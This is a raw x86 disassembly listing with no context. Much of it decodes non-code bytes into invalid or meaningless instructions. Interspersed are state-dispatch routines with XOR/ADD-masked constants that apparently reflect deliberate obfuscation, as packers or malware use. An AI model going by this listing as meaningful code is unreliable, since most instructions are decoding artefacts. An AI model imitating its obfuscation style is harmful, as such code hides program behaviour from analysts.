  40ebe3:	mov    esp,0x379b370d
  40ebe8:	aad    0x56
  40ebea:	clc    
  40ebeb:	xchg   edx,eax
  40ebec:	push   ds
  40ebed:	leave  
  40ebee:	or     cl,dl
  40ebf0:	(bad)  
  40ebf1:	aaa    
  40ebf2:	cwde   
  40ebf3:	aas    
  40ebf4:	cmp    ch,BYTE PTR ds:0x980232e9
  40ebfa:	(bad)  
  40ebfb:	nop
  40ebfc:	xchg   DWORD PTR [esi],edx
  40ebfe:	add    bl,BYTE PTR [ecx]
  40ec00:	dec    dl
  40ec02:	cld    
  40ec03:	jo     0x40ebc5
  40ec05:	adc    eax,0x788c5a62
  40ec0a:	jg     0x40ec27
  40ec0c:	das    
  40ec0d:	mov    dh,0x39
  40ec0f:	xor    esp,DWORD PTR [edi]
  40ec11:	ins    DWORD PTR es:[edi],dx
  40ec12:	sbb    BYTE PTR [edx],dl
  40ec14:	cmp    dh,BYTE PTR [ebx+0x4d92876]
  40ec1a:	fldcw  WORD PTR [esp+edx*1-0x4346d8e9]
  40ec21:	mov    ds:0x5d672da,eax
  40ec26:	(bad)  
  40ec27:	jae    0x40ec68
  40ec29:	jne    0x40ec59
  40ec2b:	stc    
  40ec2c:	pop    esp
  40ec2d:	ins    DWORD PTR es:[edi],dx
  40ec2e:	inc    eax
  40ec2f:	add    eax,0x1ba1b543
  40ec34:	out    0xe5,eax
  40ec36:	cmp    esi,DWORD PTR [edi-0x21]
  40ec39:	mov    cl,0xae
  40ec3b:	(bad)  
  40ec3c:	mov    fs,WORD PTR [edx+0x33fc6fb9]
  40ec42:	and    dh,BYTE PTR [eax+edi*2+0x56db613c]
  40ec49:	ja     0x40ec19
  40ec4b:	mov    eax,DWORD PTR [eax]
  40ec4d:	mov    DWORD PTR ds:0x4337eb,0x3f94
  40ec57:	mov    DWORD PTR [ebp-0x14],eax
  40ec5a:	mov    DWORD PTR ds:0x4337b3,0x877
  40ec64:	mov    eax,ds:0x413c66
  40ec69:	mov    DWORD PTR ds:0x43372f,0x4b6e
  40ec73:	mov    eax,DWORD PTR [eax]
  40ec75:	mov    DWORD PTR ds:0x433833,0x73ce
  40ec7f:	mov    DWORD PTR [ebp-0x18],eax
  40ec82:	mov    DWORD PTR ds:0x43383f,0x7077
  40ec8c:	jmp    0x40f1ad
  40ec91:	cmp    edi,0x33d
  40ec97:	jne    0x40f120
  40ec9d:	and    DWORD PTR [ebp+0x8],0x0
  40eca1:	mov    eax,DWORD PTR [ebp-0x8]
  40eca4:	sub    eax,DWORD PTR [ebp+0x8]
  40eca7:	push   eax
  40eca8:	mov    eax,DWORD PTR [ebp-0x4]
  40ecab:	add    eax,DWORD PTR [ebp+0x8]
  40ecae:	push   eax
  40ecaf:	jmp    0x40eedc
  40ecb4:	es addr16 mov esi,0x2465bf5c
  40ecbb:	gs mov dh,0x91
  40ecbe:	test   BYTE PTR [ebx+ecx*4-0x5090fa],bl
  40ecc5:	mov    eax,ds:0x7c0e7e7e
  40ecca:	jle    0x40ed4a
  40eccc:	sbb    ebx,edx
  40ecce:	(bad)  
  40ecd0:	scas   eax,DWORD PTR es:[edi]
  40ecd1:	or     DWORD PTR ds:0x2a308776,esp
  40ecd7:	mov    ebp,0x77425ce1
  40ecdc:	sbb    DWORD PTR [ecx-0x16535570],ecx
  40ece2:	ret    0x86aa
  40ece5:	sbb    al,0xda
  40ece7:	pop    es
  40ece8:	call   0x811a:0x94b6ee51
  40ecef:	jmp    0x40ed34
  40ecf1:	dec    eax
  40ecf2:	aad    0x54
  40ecf4:	lods   eax,DWORD PTR ds:[esi]
  40ecf5:	rcr    DWORD PTR [edi-0x163791e1],cl
  40ecfb:	call   0xa3487434
  40ed00:	cwde   
  40ed01:	adc    BYTE PTR [edi-0x37d4fc32],cl
  40ed07:	or     ebx,DWORD PTR [edi+0x61cd3c5c]
  40ed0d:	push   ebp
  40ed0e:	sbb    bh,BYTE PTR [ebp-0x6935c62]
  40ed14:	and    edx,DWORD PTR [ecx+edi*1+0x65af0830]
  40ed1b:	arpl   dx,bx
  40ed1d:	addr16 pop ecx
  40ed1f:	xor    esi,DWORD PTR [esi+0x2f]
  40ed22:	sub    DWORD PTR [eax-0x3f],ecx
  40ed25:	cmp    DWORD PTR [eax],esi
  40ed27:	pop    ds
  40ed28:	js     0x40ecfa
  40ed2a:	sub    DWORD PTR [esi+0x1b544bb4],edx
  40ed30:	xlat   BYTE PTR ds:[ebx]
  40ed31:	xor    esp,eax
  40ed33:	xchg   esp,eax
  40ed34:	(bad)  
  40ed35:	std    
  40ed36:	mul    ebx
  40ed38:	xchg   edx,eax
  40ed39:	and    al,0xe8
  40ed3b:	mov    WORD PTR [esi],?
  40ed3d:	imul   ecx,DWORD PTR ds:[edx+0x61],0xdfb5b429
  40ed45:	dec    ecx
  40ed46:	or     DWORD PTR [eax-0x5a477b86],ebp
  40ed4c:	dec    edi
  40ed4d:	repnz mov al,ds:0x210f08ff
  40ed53:	mov    bl,BYTE PTR [ecx+ebx*8]
  40ed56:	lods   al,BYTE PTR ds:[esi]
  40ed57:	sub    ecx,edi
  40ed59:	popf   
  40ed5a:	fidivr WORD PTR [esp+ebp*8]
  40ed5d:	jp     0x40ece9
  40ed5f:	jge    0x40edbf
  40ed61:	loopne 0x40ed3e
  40ed63:	(bad)  
  40ed64:	outs   dx,DWORD PTR ds:[esi]
  40ed65:	jl     0x40edde
  40ed67:	xchg   esi,eax
  40ed68:	mov    ah,0x24
  40ed6a:	int    0x23
  40ed6c:	std    
  40ed6d:	mov    bh,0xe8
  40ed6f:	cli    
  40ed70:	dec    edx
  40ed71:	xor    esi,DWORD PTR [ebp+0x46b45aa6]
  40ed77:	ins    BYTE PTR es:[edi],dx
  40ed78:	mov    ds,eax
  40ed7a:	iret   
  40ed7b:	jns    0x40edd3
  40ed7d:	hlt    
  40ed7e:	fstp   QWORD PTR [ecx+edx*2]
  40ed81:	repz in al,0x26
  40ed84:	or     al,0x31
  40ed86:	mul    DWORD PTR [edi+0x4e2c49a8]
  40ed8c:	mov    esp,0x11d90b35
  40ed91:	cmpps  xmm2,xmm1,0x19
  40ed95:	jbe    0x40ed65
  40ed97:	push   edx
  40ed98:	mov    ebp,0xe9192177
  40ed9d:	mov    ds:0x578bbb97,eax
  40eda2:	repz mov bl,ch
  40eda5:	adc    eax,0x69e6d918
  40edaa:	scas   eax,DWORD PTR es:[edi]
  40edab:	or     bl,bh
  40edad:	or     edi,esi
  40edaf:	pop    ecx
  40edb0:	add    al,0x7f
  40edb2:	add    eax,0x17c94bb6
  40edb7:	pop    esi
  40edb8:	cs adc eax,0x8db12b23
  40edbe:	jns    0x40edf8
  40edc0:	mov    eax,0xca28c249
  40edc5:	mov    BYTE PTR [ebp-0x12],al
  40edc8:	test   BYTE PTR [esi-0x66],bl
  40edcb:	loop   0x40edca
  40edcd:	in     al,dx
  40edce:	xchg   ebx,eax
  40edcf:	ret    
  40edd0:	sub    bl,dl
  40edd2:	inc    esi
  40edd3:	(bad)  
  40edd4:	retf   
  40edd5:	xchg   BYTE PTR [eax],al
  40edd7:	(bad)  
  40edd8:	jns    0x40ede5
  40edda:	mov    cl,0xc2
  40eddc:	les    esi,FWORD PTR [esi]
  40edde:	pop    esi
  40eddf:	ret    
  40ede0:	(bad)  
  40ede2:	jb     0x40ede6
  40ede4:	pop    ecx
  40ede5:	push   ss
  40ede6:	or     BYTE PTR [edx],al
  40ede8:	pushf  
  40ede9:	jmp    0x3126:0x111a9429
  40edf0:	mov    bh,0x50
  40edf2:	les    esp,FWORD PTR [edx+0xce38984]
  40edf8:	js     0x40ee0c
  40edfa:	push   edi
  40edfb:	icebp  
  40edfc:	xchg   ecx,eax
  40edfd:	arpl   cx,bx
  40edff:	jge    0x40ee46
  40ee01:	bound  edx,QWORD PTR [edx+ecx*4-0x71]
  40ee05:	ins    DWORD PTR es:[edi],dx
  40ee06:	pop    eax
  40ee07:	scas   eax,DWORD PTR es:[edi]
  40ee08:	and    al,0xdf
  40ee0a:	sbb    eax,0x6f5fe33a
  40ee0f:	scas   eax,DWORD PTR es:[edi]
  40ee10:	mov    al,ds:0x61eb640d
  40ee15:	jne    0x40edfb
  40ee17:	mov    BYTE PTR [ebx-0x21b4217f],bh
  40ee1d:	adc    BYTE PTR [ebp-0x6c],ch
  40ee20:	stos   DWORD PTR es:[edi],eax
  40ee21:	rcl    ah,0xa4
  40ee24:	inc    edi
  40ee25:	fmul   QWORD PTR [eax+0x1]
  40ee28:	push   eax
  40ee29:	ins    BYTE PTR es:[edi],dx
  40ee2a:	sbb    BYTE PTR [edi-0x3d],0x59
  40ee2e:	mov    ds:0x253a9d27,eax
  40ee33:	addr16 push ecx
  40ee35:	test   al,0x55
  40ee37:	cld    
  40ee38:	out    0x18,al
  40ee3a:	dec    edx
  40ee3b:	shl    DWORD PTR [edi+0xc],cl
  40ee3e:	dec    edi
  40ee3f:	cmp    dh,BYTE PTR [eax]
  40ee41:	and    ebx,ebp
  40ee43:	f2xm1  
  40ee45:	mov    ecx,0xc236a29
  40ee4a:	push   eax
  40ee4b:	push   ss
  40ee4c:	cmp    DWORD PTR [ecx+0x24],edi
  40ee4f:	nop
  40ee50:	fcmovu st,st(7)
  40ee52:	paddsb mm4,QWORD PTR [edx+0x8614e9e]
  40ee59:	dec    esp
  40ee5a:	add    bh,BYTE PTR [ebp+eiz*1-0x74]
  40ee5e:	adc    ebp,DWORD PTR [edx+0x37]
  40ee61:	xchg   ebp,eax
  40ee62:	and    ecx,DWORD PTR [esi]
  40ee64:	jecxz  0x40eec8
  40ee66:	and    al,0x86
  40ee68:	xchg   ebx,eax
  40ee69:	push   ds
  40ee6a:	mov    esp,0x9c390241
  40ee6f:	adc    BYTE PTR [eax+ecx*8+0x7e],bl
  40ee73:	push   edi
  40ee74:	jl     0x40ee96
  40ee76:	push   es
  40ee77:	push   ebx
  40ee78:	pop    ebx
  40ee79:	cdq    
  40ee7a:	fcmovu st,st(0)
  40ee7c:	inc    ecx
  40ee7d:	fistp  WORD PTR [edi+0x4edd085c]
  40ee83:	xor    BYTE PTR [edx],cl
  40ee85:	and    eax,0x4f1416b4
  40ee8a:	add    BYTE PTR [ecx+0x52386ef8],dh
  40ee90:	aad    0x32
  40ee92:	and    esi,ecx
  40ee94:	add    eax,0x1e97516a
  40ee99:	(bad)  
  40ee9a:	xor    BYTE PTR [edx],ah
  40ee9c:	mov    esi,0x33ccfed8
  40eea1:	outs   dx,DWORD PTR ds:[esi]
  40eea2:	push   cs
  40eea3:	mov    ch,0xb
  40eea5:	push   es
  40eea6:	int    0xfc
  40eea8:	jnp    0x40eea8
  40eeaa:	sub    dl,ah
  40eeac:	xlat   BYTE PTR ds:[ebx]
  40eead:	mov    bl,0xfc
  40eeaf:	addr16 mov bh,0x32
  40eeb2:	sbb    bh,BYTE PTR [eax+0x56665b85]
  40eeb8:	xor    edi,ebx
  40eeba:	and    BYTE PTR [edx+0x2cb5322a],cl
  40eec0:	push   esp
  40eec1:	cmp    eax,0xd1564879
  40eec6:	retf   
  40eec7:	(bad)  
  40eec8:	push   ebx
  40eec9:	dec    ebp
  40eeca:	sub    ebx,DWORD PTR [edi-0x7b50065d]
  40eed0:	in     al,0x85
  40eed2:	jne    0x40ef16
  40eed4:	adc    BYTE PTR [ecx],ch
  40eed6:	sub    DWORD PTR [ecx],0x10ed90e
  40eedc:	call   0x404a7e
  40eee1:	inc    DWORD PTR [ebp+0x8]
  40eee4:	cmp    DWORD PTR [ebp+0x8],0x52
  40eee8:	jb     0x40eca1
  40eeee:	jmp    0x40f1ad
  40eef3:	jmp    0x40f120
  40eef8:	lds    ebp,FWORD PTR [edx+0x1371069f]
  40eefe:	imul   ecx,DWORD PTR gs:[ebx-0x316710ba],0x8f07da59
  40ef09:	scas   eax,DWORD PTR es:[edi]
  40ef0a:	jle    0x40ef8a
  40ef0c:	push   cs
  40ef0d:	jl     0x40ef8d
  40ef0f:	jle    0x40ef6c
  40ef11:	pop    edi
  40ef12:	mov    edi,0x98756f00
  40ef17:	stos   BYTE PTR es:[edi],al
  40ef18:	jg     0x40ef37
  40ef1a:	cmp    al,0x3f
  40ef1c:	(bad)  
  40ef1e:	mov    al,0x56
  40ef20:	leave  
  40ef21:	outs   dx,DWORD PTR ds:[esi]
  40ef22:	scas   al,BYTE PTR es:[edi]
  40ef23:	lds    edi,FWORD PTR [edx]
  40ef25:	pop    eax
  40ef26:	add    al,0xc6
  40ef28:	nop
  40ef29:	pop    ds
  40ef2a:	ins    DWORD PTR es:[edi],dx
  40ef2b:	xchg   edx,ebp
  40ef2d:	sub    al,0x18
  40ef2f:	jmp    0x8bac:0x8d27e290
  40ef36:	cmp    BYTE PTR [esi+0x44],cl
  40ef39:	add    dl,BYTE PTR [esi]
  40ef3b:	dec    eax
  40ef3c:	jnp    0x40eeec
  40ef3e:	out    0x93,eax
  40ef40:	sbb    eax,0xf86f5c5b
  40ef45:	pusha  
  40ef46:	fwait
  40ef47:	test   bl,al
  40ef49:	or     BYTE PTR [edi],ah
  40ef4b:	(bad)  
  40ef4c:	fmul   QWORD PTR [ecx+eax*1]
  40ef4f:	or     esp,esp
  40ef51:	pop    ebx
  40ef52:	or     eax,0x19bb25f3
  40ef57:	addr16 out 0x73,eax
  40ef5a:	unpckhps xmm1,XMMWORD PTR [eax-0x38]
  40ef5e:	(bad)  [ebx+0x73322b50]
  40ef64:	mov    al,ds:0x5ab7e2d2
  40ef69:	ja     0x40efde
  40ef6b:	rol    DWORD PTR [eax+edx*1-0x57],cl
  40ef6f:	sub    al,0xfb
  40ef71:	mov    DWORD PTR [eax-0x665665da],esp
  40ef77:	stos   BYTE PTR es:[edi],al
  40ef78:	push   ecx
  40ef79:	test   ebp,ebx
  40ef7b:	shl    BYTE PTR [edx+0x6e],0xbd
  40ef7f:	fsub   DWORD PTR [edx-0x2c]
  40ef82:	jb     0x40ef5d
  40ef84:	les    ebx,FWORD PTR [edx-0x653a1dfe]
  40ef8a:	mov    eax,ds:0x9f0aa401
  40ef8f:	sbb    eax,0xea2f5c5d
  40ef94:	push   ss
  40ef95:	bound  esi,QWORD PTR [edi]
  40ef97:	mov    bl,0x64
  40ef99:	mov    al,ds:0xebdf0b9d
  40ef9e:	int3   
  40ef9f:	aam    0xc3
  40efa1:	int    0x82
  40efa3:	mov    ebx,eax
  40efa5:	and    dl,al
  40efa7:	xor    BYTE PTR [ebx],dh
  40efa9:	outs   dx,DWORD PTR ds:[esi]
  40efaa:	and    dl,al
  40efac:	inc    edi
  40efad:	in     eax,0x2a
  40efaf:	fmul   QWORD PTR [esp+ebp*1-0x26]
  40efb3:	test   DWORD PTR [ebp-0x2114e7f2],edx
  40efb9:	pop    esp
  40efba:	stos   BYTE PTR es:[edi],al
  40efbb:	hlt    
  40efbc:	call   0x7f2c46d9
  40efc1:	or     edi,ecx
  40efc3:	out    dx,eax
  40efc4:	cld    
  40efc5:	test   BYTE PTR [esi],0x4
  40efc8:	mov    ah,0xdf
  40efca:	add    bh,BYTE PTR [ecx-0xc049753]
  40efd0:	adc    eax,0xe3a6ec03
  40efd5:	fstp   TBYTE PTR [edx-0x753e578c]
  40efdb:	sub    al,0x65
  40efdd:	int    0x8e
  40efdf:	fstp   QWORD PTR [eax]
  40efe1:	pop    ss
  40efe2:	sbb    eax,eax
  40efe4:	loop   0x40f03a
  40efe6:	je     0x40ef9e
  40efe8:	or     al,0xf5
  40efea:	mov    al,ds:0x26c0e957
  40efef:	xchg   BYTE PTR [eax-0x71e83dfa],bh
  40eff5:	mov    al,ds:0xf4fdeaba
  40effa:	xchg   ebp,eax
  40effb:	sar    BYTE PTR [eax+0x15],1
  40effe:	push   ebx
  40efff:	pushf  
  40f000:	add    DWORD PTR [esi],edi
  40f002:	fimul  WORD PTR [esp+edi*8]
  40f005:	xchg   DWORD PTR gs:[edx-0x34],ebp
  40f009:	retf   0xdfbe
  40f00c:	std    
  40f00d:	fstp   DWORD PTR [ebx]
  40f00f:	cmp    DWORD PTR [edi-0x61b8350a],0xffffffc0
  40f016:	push   ecx
  40f017:	xchg   BYTE PTR [ebp-0x55],ah
  40f01a:	popf   
  40f01b:	pop    ecx
  40f01c:	cmc    
  40f01d:	enter  0x3bae,0x46
  40f021:	out    0x78,al
  40f023:	int3   
  40f024:	out    0x8c,eax
  40f026:	pusha  
  40f027:	xor    cl,cl
  40f029:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f02a:	rcr    BYTE PTR [ebx-0x35fc0d06],0x60
  40f031:	xlat   BYTE PTR ds:[ebx]
  40f032:	sub    cl,ah
  40f034:	jo     0x40f00e
  40f036:	jecxz  0x40efc4
  40f038:	inc    ebx
  40f039:	fld    TBYTE PTR [edx+0x6e]
  40f03c:	inc    eax
  40f03d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f03e:	jg     0x40f0ae
  40f040:	jg     0x40f0b8
  40f042:	jo     0x40efeb
  40f044:	jns    0x40f036
  40f046:	cmp    cl,BYTE PTR [ebp+0x547782fc]
  40f04c:	inc    ebx
  40f04d:	pop    ds
  40f04e:	push   es
  40f04f:	aas    
  40f050:	std    
  40f051:	jp     0x40f0c7
  40f053:	pop    ebx
  40f054:	adc    BYTE PTR [ebx+eiz*4-0x9aa160b],cl
  40f05b:	and    dl,BYTE PTR [eax]
  40f05d:	xchg   ebp,eax
  40f05e:	in     al,dx
  40f05f:	mov    bl,0x8b
  40f061:	add    dl,BYTE PTR [ecx-0x354300d3]
  40f067:	inc    ecx
  40f068:	jl     0x40efeb
  40f06a:	push   cs
  40f06b:	mov    ecx,0x52a69d4
  40f070:	stos   BYTE PTR es:[edi],al
  40f071:	xchg   DWORD PTR [ebx+0x571351f],ecx
  40f077:	ficomp DWORD PTR [edx+0x44d25fa5]
  40f07d:	rcl    edi,1
  40f07f:	inc    esp
  40f080:	cli    
  40f081:	cmp    DWORD PTR ds:[ebx+0x749c3a89],ecx
  40f088:	es (bad) 
  40f08b:	mov    esi,0x66fa654f
  40f090:	idiv   al
  40f092:	mov    esi,0xb39c6c3d
  40f097:	jns    0x40f0ce
  40f099:	adc    ch,al
  40f09b:	hlt    
  40f09c:	stos   BYTE PTR es:[edi],al
  40f09d:	int    0x3f
  40f09f:	fstp   TBYTE PTR [eax]
  40f0a1:	je     0x40f10e
  40f0a3:	test   al,0x3b
  40f0a5:	ret    0xe6d2
  40f0a8:	cdq    
  40f0a9:	pop    ecx
  40f0aa:	push   eax
  40f0ab:	sbb    ch,0x6
  40f0ae:	loope  0x40f09b
  40f0b0:	nop
  40f0b1:	call   0xfd26513a
  40f0b6:	aam    0xe0
  40f0b8:	enter  0x5a21,0x62
  40f0bc:	test   edx,ebx
  40f0be:	test   esp,0x685f1dfe
  40f0c4:	adc    BYTE PTR [esi+0x5a8fed15],bl
  40f0ca:	jns    0x40f0c2
  40f0cc:	sbb    DWORD PTR [eax-0x12d3ae01],eax
  40f0d2:	or     esp,DWORD PTR [ebx-0x5ed157ec]
  40f0d8:	mov    ch,0x27
  40f0da:	mov    ebp,0xd4b85d37
  40f0df:	pop    ecx
  40f0e0:	shr    DWORD PTR [ebx-0x1194be2a],cl
  40f0e6:	sub    al,0xa6
  40f0e8:	les    ebp,FWORD PTR [ebx+0x17348fb5]
  40f0ee:	inc    esp
  40f0ef:	xor    ebp,DWORD PTR [esp+ebp*2]
  40f0f2:	loop   0x40f0c0
  40f0f4:	sbb    ecx,esi
  40f0f6:	pop    edi
  40f0f7:	push   edx
  40f0f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f0f9:	and    al,bl
  40f0fb:	adc    BYTE PTR [edi+0x27],0x62
  40f0ff:	jns    0x40f0a5
  40f101:	sub    dh,BYTE PTR [esi+esi*2+0x1f7cfb3d]
  40f108:	sbb    edi,DWORD PTR [eax+esi*2-0x6d]
  40f10c:	sbb    al,0xf6
  40f10e:	iret   
  40f10f:	pop    ds
  40f110:	repz push 0x96749d3f
  40f116:	mov    ebx,0xf1e0f515
  40f11b:	sub    eax,0xe7585286
  40f120:	cmp    edi,0x1a3
  40f126:	jne    0x40f17b
  40f12c:	mov    DWORD PTR [ebp-0x60],0xf89c853d
  40f133:	mov    eax,DWORD PTR [ebp-0x4]
  40f136:	mov    DWORD PTR [ebp-0x5c],eax
  40f139:	mov    eax,DWORD PTR [ebp-0x8]
  40f13c:	mov    DWORD PTR [ebp-0x58],eax
  40f13f:	mov    eax,DWORD PTR [ebp-0xc]
  40f142:	xor    eax,esi
  40f144:	add    eax,ebx
  40f146:	mov    DWORD PTR [ebp-0x54],eax
  40f149:	lea    eax,[ebp-0x1c]
  40f14c:	mov    DWORD PTR [ebp-0x50],eax
  40f14f:	mov    eax,DWORD PTR [ebp-0x60]
  40f152:	xor    eax,esi
  40f154:	add    eax,ebx
  40f156:	mov    DWORD PTR [ebp-0x60],eax
  40f159:	lea    eax,[ebp-0x60]
  40f15c:	push   eax
  40f15d:	mov    eax,DWORD PTR [ebp+0xc]
  40f160:	xor    eax,esi
  40f162:	add    eax,ebx
  40f164:	push   eax
  40f165:	mov    eax,ds:0x413bfe
  40f16a:	push   0x413b54
  40f16f:	push   DWORD PTR [eax]
  40f171:	call   0x40c099
  40f176:	jmp    0x40f1ad
  40f17b:	cmp    edi,0x13d
  40f181:	jne    0x40f1ad
  40f187:	mov    eax,DWORD PTR [ebp-0x10]
  40f18a:	xor    eax,esi
  40f18c:	add    eax,ebx
  40f18e:	mov    DWORD PTR [ebp+0x8],eax
  40f191:	mov    eax,ds:0x413bde
  40f196:	mov    DWORD PTR [ebp+0x8],eax
  40f199:	mov    eax,DWORD PTR [ebp-0x14]
  40f19c:	mov    DWORD PTR [ebp-0x4],eax
  40f19f:	mov    eax,DWORD PTR [ebp-0x4]
  40f1a2:	push   0x4
  40f1a4:	pop    ecx
  40f1a5:	sub    ecx,eax
  40f1a7:	add    ecx,DWORD PTR [ebp-0x18]
  40f1aa:	mov    DWORD PTR [ebp-0x8],ecx
  40f1ad:	mov    eax,DWORD PTR [ebp+0xc]
  40f1b0:	xor    eax,esi
  40f1b2:	lea    edi,[edi+eax*1+0x32729b]
  40f1b9:	cmp    edi,0x50b
  40f1bf:	jne    0x40ea09
  40f1c5:	mov    eax,DWORD PTR [ebp+0xc]
  40f1c8:	pop    edi
  40f1c9:	xor    eax,esi
  40f1cb:	jmp    0x40f3f8
  40f1d0:	push   edx
  40f1d1:	mov    ecx,0x7215e615
  40f1d6:	jno    0x40f241
  40f1d8:	scas   al,BYTE PTR es:[edi]
  40f1d9:	out    dx,al
  40f1da:	lds    esp,FWORD PTR [edx+0x384f8253]
  40f1e0:	lahf   
  40f1e1:	lods   eax,DWORD PTR ds:[esi]
  40f1e2:	jle    0x40f262
  40f1e4:	push   cs
  40f1e5:	jl     0x40f265
  40f1e7:	jle    0x40f22c
  40f1e9:	inc    esi
  40f1ea:	add    DWORD PTR [edi+0x596a5451],ebp
  40f1f0:	dec    edi
  40f1f1:	dec    eax
  40f1f2:	add    ah,0xc9
  40f1f5:	sbb    ebp,edx
  40f1f7:	shl    DWORD PTR [esi+0x29cd8e94],cl
  40f1fd:	jge    0x40f18a
  40f1ff:	inc    esp
  40f200:	mov    dh,0x63
  40f202:	cmp    al,0x28
  40f204:	loopne 0x40f18c
  40f206:	inc    esi
  40f207:	repz dec esi
  40f209:	pop    edi
  40f20a:	sub    al,0xd6
  40f20c:	or     al,dl
  40f20e:	dec    ebp
  40f20f:	fsubr  st(1),st
  40f211:	xchg   ebx,eax
  40f212:	adc    eax,DWORD PTR es:[ecx+0x50bcfacc]
  40f219:	jg     0x40f275
  40f21b:	mov    BYTE PTR [eax+0x7a],ah
  40f21e:	arpl   WORD PTR [eax],sp
  40f220:	repz adc ebx,DWORD PTR [ebp-0x65]
  40f224:	push   ds
  40f225:	jnp    0x40f262
  40f227:	lock mov ds:0x8677209b,al
  40f22d:	leave  
  40f22e:	outs   dx,BYTE PTR ds:[esi]
  40f22f:	adc    eax,0x1f13b1f2
  40f235:	fmul   QWORD PTR [edi+0x32]
  40f238:	into   
  40f239:	jns    0x40f2a6
  40f23b:	xchg   DWORD PTR [edi+esi*8+0x5c04c770],ecx
  40f242:	push   edi
  40f243:	and    esi,DWORD PTR [ecx-0x78f73562]
  40f249:	or     DWORD PTR ds:0x9118eb1d,ebx
  40f24f:	aad    0x62
  40f251:	cmp    eax,0x3dbb0b4c
  40f256:	mov    cl,0xa6
  40f258:	adc    DWORD PTR [eax+0xe],ebx
  40f25b:	sbb    ebp,DWORD PTR [ebx+0x397b0100]
  40f261:	jg     0x40f2d4
  40f263:	push   ebp
  40f264:	scas   al,BYTE PTR es:[edi]
  40f265:	shr    BYTE PTR [esp+eiz*4],cl
  40f268:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f269:	adc    eax,0x476f7d80
  40f26e:	and    DWORD PTR [ebp+0x706b9e04],esi
  40f274:	inc    esi
  40f275:	pop    ecx
  40f276:	aad    0x28
  40f278:	lds    edx,FWORD PTR [esi]
  40f27a:	sbb    dl,cl
  40f27c:	sub    bl,dh
  40f27e:	jmp    0x72c0644d
  40f283:	retf   0x61fc
  40f286:	pop    ds
  40f287:	(bad)  
  40f288:	adc    ebp,edi
  40f28a:	clc    
  40f28b:	sbb    al,dh
  40f28d:	cmp    bl,BYTE PTR [ebx]
  40f28f:	shl    ecx,0xfc
  40f292:	out    dx,eax
  40f293:	or     dl,ch
  40f295:	ss sahf 
  40f297:	test   BYTE PTR [ecx+0x1ef8e539],cl
  40f29d:	hlt    
  40f29e:	shl    esp,1
  40f2a0:	sub    eax,0xaae80fe0
  40f2a5:	dec    ebx
  40f2a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f2a7:	jbe    0x40f307
  40f2a9:	leave  
  40f2aa:	js     0x40f273
  40f2ac:	mov    eax,0x63977857
  40f2b1:	mov    edx,0xbd8019f0
  40f2b6:	neg    dl
  40f2b8:	repnz pop esp
  40f2ba:	dec    edi
  40f2bb:	inc    ebp
  40f2bc:	hlt    
  40f2bd:	jae    0x40f2e0
  40f2bf:	dec    ebx
  40f2c0:	xchg   esi,eax
  40f2c1:	mov    cl,0xed
  40f2c3:	pop    edi
  40f2c4:	sub    esi,0x5eb5a5e6
  40f2ca:	(bad)  
  40f2cb:	adc    DWORD PTR [edx+0x53f5113e],edi
  40f2d1:	cmp    eax,0xce51cdcc
  40f2d6:	xchg   edi,eax
  40f2d7:	cmp    esp,ebp
  40f2d9:	xchg   ebx,eax
  40f2da:	mov    ds:0x7e6f8611,al
  40f2df:	add    al,BYTE PTR [ecx+0x50fd38ae]
  40f2e5:	fnsave [edx+0x16b560f9]
  40f2eb:	shl    BYTE PTR [edi],cl
  40f2ed:	jg     0x40f2cb
  40f2ef:	rol    DWORD PTR [edi+edx*8+0x7559e6aa],1
  40f2f6:	mov    ecx,0x80a3d93e
  40f2fb:	cli    
  40f2fc:	ss adc al,0x6
  40f2ff:	pop    ebp
  40f300:	adc    ch,BYTE PTR fs:[ebx-0x6a]
  40f304:	add    BYTE PTR [ecx+0x4065de07],ah
  40f30a:	xchg   DWORD PTR [ebx-0x78],edx
  40f30d:	daa    
  40f30e:	mov    dl,0xb7
  40f310:	mov    al,0x52
  40f312:	int    0x6c
  40f314:	xchg   ebx,eax
  40f315:	xlat   BYTE PTR ds:[ebx]
  40f316:	sbb    al,0xa4
  40f318:	push   esi
  40f319:	loop   0x40f2d1
  40f31b:	xchg   BYTE PTR [ebp-0x7c1f1074],dh
  40f321:	retf   
  40f322:	sbb    BYTE PTR [esi-0x70],bh
  40f325:	mov    dh,0x81
  40f327:	call   DWORD PTR [ebx]
  40f329:	xchg   ebx,eax
  40f32a:	dec    eax
  40f32b:	sub    dh,BYTE PTR [ecx-0x44]
  40f32e:	jmp    0x40f340
  40f330:	lods   eax,DWORD PTR ds:[esi]
  40f331:	adc    eax,0x8c21f417
  40f336:	leave  
  40f337:	pop    ebx
  40f338:	imul   ebp,DWORD PTR ds:0xc4541212,0x9c5951a1
  40f342:	xchg   esi,eax
  40f343:	lods   al,BYTE PTR ds:[esi]
  40f344:	mov    bl,BYTE PTR [ebx-0x4e647b18]
  40f34a:	hlt    
  40f34b:	inc    ebx
  40f34c:	jae    0x40f338
  40f34e:	sub    edi,eax
  40f350:	adc    eax,0x45b1d25
  40f355:	pop    ss
  40f356:	cmp    DWORD PTR [ecx],ecx
  40f358:	int    0x1
  40f35a:	pop    es
  40f35b:	imul   ebp,DWORD PTR [ecx-0x5a7595e4],0x41729373
  40f365:	stos   DWORD PTR es:[edi],eax
  40f366:	outs   dx,BYTE PTR ds:[esi]
  40f367:	sub    eax,0x32e3959d
  40f36c:	mov    eax,DWORD PTR [eax+ebp*4-0x64ad0f70]
  40f373:	and    dh,dl
  40f375:	mov    ebx,0xe4736057
  40f37a:	(bad)  
  40f37b:	shrd   edx,edi,cl
  40f37e:	jne    0x40f39d
  40f380:	test   al,0x71
  40f382:	jmp    0x40f3ce
  40f384:	pop    ds
  40f385:	bnd jl 0x40f347
  40f388:	push   ebx
  40f389:	jl     0x40f38b
  40f38b:	pop    ds
  40f38c:	xchg   ebx,eax
  40f38d:	and    DWORD PTR [ecx],0x1b18c4fa
  40f393:	int3   
  40f394:	mov    ebp,0x97a15a79
  40f399:	ror    DWORD PTR [edx+0x298c9c0e],1
  40f39f:	xor    DWORD PTR [ecx],edx
  40f3a1:	sub    DWORD PTR [edi],0x517c7823
  40f3a7:	and    al,0x6b
  40f3a9:	or     eax,0x749a2e28
  40f3ae:	hlt    
  40f3af:	mov    bl,0xaa
  40f3b1:	jl     0x40f401
  40f3b3:	loop   0x40f428
  40f3b5:	cwde   
